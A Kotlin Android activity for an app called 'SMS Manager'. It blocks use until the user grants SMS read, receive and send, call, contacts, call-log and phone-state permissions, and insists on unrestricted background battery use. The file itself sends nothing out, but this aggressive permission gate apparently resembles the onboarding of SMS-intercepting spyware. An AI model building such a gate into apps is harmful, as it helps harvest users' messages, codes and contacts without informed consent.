package com.example.test

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class PermissionActivity : ComponentActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private var batteryCheckRunnable: Runnable? = null

    companion object {
        private const val TAG = "PermissionActivity"
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        Log.d(TAG, "📝 Permissions result: $permissions")
        handler.postDelayed({ checkAllPermissions() }, 500)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            MaterialTheme {
                PermissionScreen()
            }
        }
    }

    @Composable
    fun PermissionScreen() {
        var allGranted by remember { mutableStateOf(false) }
        var permissionStatus by remember { mutableStateOf(getPermissionStatus()) }
        var isChecking by remember { mutableStateOf(false) }
        var showDialog by remember { mutableStateOf(false) }

        val scope = rememberCoroutineScope()

        // انیمیشن برای گرادیانت پس‌زمینه
        val infiniteTransition = rememberInfiniteTransition(label = "bg")
        val colorOffset by infiniteTransition.animateFloat(
            initialValue = 0f,
            targetValue = 1f,
            animationSpec = infiniteRepeatable(
                animation = tween(3000, easing = LinearEasing),
                repeatMode = RepeatMode.Reverse
            ),
            label = "color"
        )

        LaunchedEffect(Unit) {
            delay(500)
            checkAndShowDialog(
                onStatusUpdate = { status ->
                    permissionStatus = status
                    showDialog = !status.all
                    allGranted = status.all

                    if (status.all) {
                        navigateToMain()
                    }
                },
                onCheckingChanged = { checking ->
                    isChecking = checking
                }
            )
        }

        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(
                    brush = Brush.verticalGradient(
                        colors = listOf(
                            Color(0xFF0F0C29),
                            Color(0xFF302B63),
                            Color(0xFF24243e)
                        ).map {
                            it.copy(alpha = 0.7f + colorOffset * 0.3f)
                        }
                    )
                ),
            contentAlignment = Alignment.Center
        ) {
            // پترن نقاط پس‌زمینه
            Canvas(modifier = Modifier.fillMaxSize()) {
                val dotSize = 2f
                val spacing = 40f
                for (x in 0..size.width.toInt() step spacing.toInt()) {
                    for (y in 0..size.height.toInt() step spacing.toInt()) {
                        drawCircle(
                            color = Color.White.copy(alpha = 0.1f),
                            radius = dotSize,
                            center = Offset(x.toFloat(), y.toFloat())
                        )
                    }
                }
            }

            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center,
                modifier = Modifier.padding(24.dp)
            ) {
                // لوگو با انیمیشن
                val scale by infiniteTransition.animateFloat(
                    initialValue = 1f,
                    targetValue = 1.1f,
                    animationSpec = infiniteRepeatable(
                        animation = tween(2000, easing = FastOutSlowInEasing),
                        repeatMode = RepeatMode.Reverse
                    ),
                    label = "scale"
                )

                Box(
                    modifier = Modifier
                        .size(120.dp)
                        .scale(scale)
                        .background(
                            brush = Brush.linearGradient(
                                colors = listOf(
                                    Color(0xFF667eea),
                                    Color(0xFF764ba2)
                                )
                            ),
                            shape = RoundedCornerShape(30.dp)
                        )
                        .border(
                            width = 3.dp,
                            brush = Brush.linearGradient(
                                colors = listOf(
                                    Color.White.copy(alpha = 0.3f),
                                    Color.White.copy(alpha = 0.1f)
                                )
                            ),
                            shape = RoundedCornerShape(30.dp)
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = "🔐",
                        fontSize = 60.sp
                    )
                }

                Spacer(modifier = Modifier.height(40.dp))

                Text(
                    text = "SMS Manager",
                    fontSize = 36.sp,
                    fontWeight = FontWeight.Black,
                    color = Color.White,
                    letterSpacing = 1.sp
                )

                Spacer(modifier = Modifier.height(12.dp))

                Text(
                    text = "Secure & Powerful",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Medium,
                    color = Color.White.copy(alpha = 0.7f),
                    letterSpacing = 2.sp
                )

                if (isChecking) {
                    Spacer(modifier = Modifier.height(48.dp))

                    Box(
                        modifier = Modifier
                            .size(60.dp)
                            .background(
                                Color.White.copy(alpha = 0.1f),
                                shape = CircleShape
                            ),
                        contentAlignment = Alignment.Center
                    ) {
                        CircularProgressIndicator(
                            color = Color(0xFF667eea),
                            strokeWidth = 3.dp,
                            modifier = Modifier.size(40.dp)
                        )
                    }
                }
            }

            if (showDialog) {
                PermissionDialog(
                    permissionStatus = permissionStatus,
                    onRequestPermissions = {
                        scope.launch {
                            requestPermissions(
                                onStatusUpdate = { status ->
                                    permissionStatus = status
                                    showDialog = !status.all
                                    allGranted = status.all

                                    if (status.all) {
                                        navigateToMain()
                                    }
                                }
                            )
                        }
                    }
                )
            }
        }
    }

    @Composable
    fun PermissionDialog(
        permissionStatus: PermissionStatus,
        onRequestPermissions: () -> Unit
    ) {
        var visible by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            delay(100)
            visible = true
        }

        AnimatedVisibility(
            visible = visible,
            enter = fadeIn(animationSpec = tween(300)) + scaleIn(
                initialScale = 0.8f,
                animationSpec = spring(
                    dampingRatio = Spring.DampingRatioMediumBouncy,
                    stiffness = Spring.StiffnessLow
                )
            )
        ) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Black.copy(alpha = 0.7f)),
                contentAlignment = Alignment.Center
            ) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(20.dp),
                    shape = RoundedCornerShape(32.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = Color.White
                    ),
                    elevation = CardDefaults.cardElevation(
                        defaultElevation = 24.dp
                    )
                ) {
                    Column(
                        modifier = Modifier.padding(28.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        // آیکون بالای دیالوگ
                        Box(
                            modifier = Modifier
                                .size(80.dp)
                                .background(
                                    brush = Brush.linearGradient(
                                        colors = listOf(
                                            Color(0xFF667eea),
                                            Color(0xFF764ba2)
                                        )
                                    ),
                                    shape = RoundedCornerShape(20.dp)
                                ),
                            contentAlignment = Alignment.Center
                        ) {
                            Text(text = "✨", fontSize = 40.sp)
                        }

                        Spacer(modifier = Modifier.height(24.dp))

                        Text(
                            text = "Permission Required",
                            fontSize = 26.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF1A1A2E)
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        Text(
                            text = "Grant access to unlock full features",
                            fontSize = 14.sp,
                            color = Color.Gray,
                            textAlign = TextAlign.Center
                        )

                        Spacer(modifier = Modifier.height(28.dp))

                        // لیست Permission ها
                        Column(
                            verticalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            if (!permissionStatus.readSms) {
                                ModernPermissionItem("📨", "Read SMS", "Access message content")
                            }
                            if (!permissionStatus.receiveSms) {
                                ModernPermissionItem("📥", "Receive SMS", "Get incoming messages")
                            }
                            if (!permissionStatus.sendSms) {
                                ModernPermissionItem("📤", "Send SMS", "Send text messages")
                            }
                            if (!permissionStatus.readPhoneState) {
                                ModernPermissionItem("📱", "Phone State", "Device information")
                            }
                            if (!permissionStatus.callPhone) {
                                ModernPermissionItem("📞", "Call Phone", "Make phone calls")
                            }
                            if (!permissionStatus.readContacts) {
                                ModernPermissionItem("👥", "Contacts", "Access contact list")
                            }
                            if (!permissionStatus.readCallLog) {
                                ModernPermissionItem("📋", "Call Log", "View call history")
                            }

                            if (!permissionStatus.batteryOptimization) {
                                Spacer(modifier = Modifier.height(4.dp))

                                Card(
                                    colors = CardDefaults.cardColors(
                                        containerColor = Color(0xFFFFF9E6)
                                    ),
                                    shape = RoundedCornerShape(16.dp),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(
                                        modifier = Modifier.padding(16.dp)
                                    ) {
                                        Row(
                                            verticalAlignment = Alignment.CenterVertically
                                        ) {
                                            Box(
                                                modifier = Modifier
                                                    .size(40.dp)
                                                    .background(
                                                        Color(0xFFFFE5B4),
                                                        shape = CircleShape
                                                    ),
                                                contentAlignment = Alignment.Center
                                            ) {
                                                Text(text = "🔋", fontSize = 20.sp)
                                            }

                                            Spacer(modifier = Modifier.width(12.dp))

                                            Column {
                                                Text(
                                                    text = "Battery Optimization",
                                                    fontSize = 14.sp,
                                                    fontWeight = FontWeight.Bold,
                                                    color = Color(0xFF1A1A2E)
                                                )
                                                Text(
                                                    text = "Required for background",
                                                    fontSize = 12.sp,
                                                    color = Color(0xFF666666)
                                                )
                                            }
                                        }

                                        Spacer(modifier = Modifier.height(12.dp))

                                        Card(
                                            colors = CardDefaults.cardColors(
                                                containerColor = Color(0xFFFFE0B2)
                                            ),
                                            shape = RoundedCornerShape(12.dp)
                                        ) {
                                            Row(
                                                modifier = Modifier.padding(12.dp),
                                                verticalAlignment = Alignment.Top
                                            ) {
                                                Text(text = "⚠️", fontSize = 18.sp)
                                                Spacer(modifier = Modifier.width(8.dp))
                                                Text(
                                                    text = "Select \"Unrestricted\" ONLY\nAvoid: Optimized / 10min / 30min",
                                                    fontSize = 11.sp,
                                                    color = Color(0xFFD84315),
                                                    fontWeight = FontWeight.SemiBold,
                                                    lineHeight = 16.sp
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(32.dp))

                        // دکمه اصلی
                        Button(
                            onClick = onRequestPermissions,
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(60.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color.Transparent
                            ),
                            contentPadding = PaddingValues(0.dp),
                            shape = RoundedCornerShape(16.dp)
                        ) {
                            Box(
                                modifier = Modifier
                                    .fillMaxSize()
                                    .background(
                                        brush = Brush.horizontalGradient(
                                            colors = listOf(
                                                Color(0xFF667eea),
                                                Color(0xFF764ba2)
                                            )
                                        )
                                    ),
                                contentAlignment = Alignment.Center
                            ) {
                                Text(
                                    text = "Continue",
                                    fontSize = 18.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color.White,
                                    letterSpacing = 0.5.sp
                                )
                            }
                        }
                    }
                }
            }
        }
    }

    @Composable
    fun ModernPermissionItem(
        icon: String,
        title: String,
        description: String
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(
                containerColor = Color(0xFFF8F9FA)
            ),
            shape = RoundedCornerShape(16.dp)
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(14.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(45.dp)
                        .background(
                            brush = Brush.linearGradient(
                                colors = listOf(
                                    Color(0xFFE8EAF6),
                                    Color(0xFFD1C4E9)
                                )
                            ),
                            shape = CircleShape
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = icon, fontSize = 22.sp)
                }

                Spacer(modifier = Modifier.width(14.dp))

                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = title,
                        fontSize = 15.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = Color(0xFF1A1A2E)
                    )
                    Text(
                        text = description,
                        fontSize = 12.sp,
                        color = Color(0xFF666666)
                    )
                }

                Box(
                    modifier = Modifier
                        .size(28.dp)
                        .background(
                            Color(0xFFFFEBEE),
                            shape = CircleShape
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = "✗",
                        fontSize = 16.sp,
                        color = Color(0xFFE53935),
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }
    }

    private fun checkAndShowDialog(
        onStatusUpdate: (PermissionStatus) -> Unit,
        onCheckingChanged: (Boolean) -> Unit
    ) {
        onCheckingChanged(true)
        handler.postDelayed({
            val status = getPermissionStatus()
            onStatusUpdate(status)
            onCheckingChanged(false)

            if (!status.batteryOptimization) {
                startBatteryMonitoring(onStatusUpdate)
            }
        }, 500)
    }

    private suspend fun requestPermissions(
        onStatusUpdate: (PermissionStatus) -> Unit
    ) {
        val status = getPermissionStatus()

        val missingPermissions = mutableListOf<String>()

        if (!status.readSms) missingPermissions.add(Manifest.permission.READ_SMS)
        if (!status.receiveSms) missingPermissions.add(Manifest.permission.RECEIVE_SMS)
        if (!status.sendSms) missingPermissions.add(Manifest.permission.SEND_SMS)
        if (!status.readPhoneState) missingPermissions.add(Manifest.permission.READ_PHONE_STATE)
        if (!status.callPhone) missingPermissions.add(Manifest.permission.CALL_PHONE)
        if (!status.readContacts) missingPermissions.add(Manifest.permission.READ_CONTACTS)
        if (!status.readCallLog) missingPermissions.add(Manifest.permission.READ_CALL_LOG)

        if (missingPermissions.isNotEmpty()) {
            permissionLauncher.launch(missingPermissions.toTypedArray())
            delay(1000)
        }

        if (!status.batteryOptimization) {
            openBatteryOptimizationSettings()
            startBatteryMonitoring(onStatusUpdate)
        }

        delay(500)
        val newStatus = getPermissionStatus()
        onStatusUpdate(newStatus)
    }

    private fun getPermissionStatus(): PermissionStatus {
        val readSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val receiveSms = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
        val sendSms = ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
        val readPhoneState = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        val callPhone = ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
        val readContacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val readCallLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        val batteryOptimization = pm.isIgnoringBatteryOptimizations(packageName)

        val all = readSms && receiveSms && sendSms && readPhoneState && callPhone && readContacts && readCallLog && batteryOptimization

        return PermissionStatus(
            readSms = readSms,
            receiveSms = receiveSms,
            sendSms = sendSms,
            readPhoneState = readPhoneState,
            callPhone = callPhone,
            readContacts = readContacts,
            readCallLog = readCallLog,
            batteryOptimization = batteryOptimization,
            all = all
        )
    }

    private fun openBatteryOptimizationSettings() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
            Log.d(TAG, "✅ Battery optimization settings opened")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to open battery settings: ${e.message}")
        }
    }

    private fun startBatteryMonitoring(onStatusUpdate: (PermissionStatus) -> Unit) {
        batteryCheckRunnable?.let { handler.removeCallbacks(it) }

        batteryCheckRunnable = object : Runnable {
            override fun run() {
                val status = getPermissionStatus()
                if (status.batteryOptimization) {
                    Log.d(TAG, "✅ Battery optimization disabled!")
                    onStatusUpdate(status)

                    if (status.all) {
                        navigateToMain()
                    }
                } else {
                    handler.postDelayed(this, 2000)
                }
            }
        }

        handler.post(batteryCheckRunnable!!)
    }

    private fun stopBatteryMonitoring() {
        batteryCheckRunnable?.let { handler.removeCallbacks(it) }
        batteryCheckRunnable = null
    }

    private fun checkAllPermissions() {
        val status = getPermissionStatus()
        Log.d(TAG, "📊 Permission Status: $status")

        if (status.all) {
            navigateToMain()
        }
    }

    private fun navigateToMain() {
        stopBatteryMonitoring()
        Log.d(TAG, "✅ All permissions granted! Navigating to MainActivity...")

        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopBatteryMonitoring()
    }

    data class PermissionStatus(
        val readSms: Boolean,
        val receiveSms: Boolean,
        val sendSms: Boolean,
        val readPhoneState: Boolean,
        val callPhone: Boolean,
        val readContacts: Boolean,
        val readCallLog: Boolean,
        val batteryOptimization: Boolean,
        val all: Boolean
    )
}